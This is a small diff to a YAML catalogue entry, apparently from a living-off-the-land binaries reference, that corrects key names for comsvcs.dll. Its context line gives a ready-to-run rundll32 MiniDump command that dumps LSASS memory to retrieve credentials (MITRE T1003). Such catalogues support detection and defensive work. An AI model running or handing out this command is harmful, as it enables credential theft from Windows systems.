@@ -6,11 +6,11 @@ Created: '2019-08-30'
 Commands:
   - Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump "[LSASS_PID] dump.bin full"
     Description: Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump. 
-    UseCase: Dump Lsass.exe process memory to retrieve credentials.
+    Usecase: Dump Lsass.exe process memory to retrieve credentials.
     Category: Dump
     Privileges: SYSTEM
     MitreID: T1003
-    MItreLink: https://attack.mitre.org/wiki/Technique/T1003
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1003
     OperatingSystem: Windows
 Full_Path:
   - Path: c:\windows\system32\comsvcs.dll
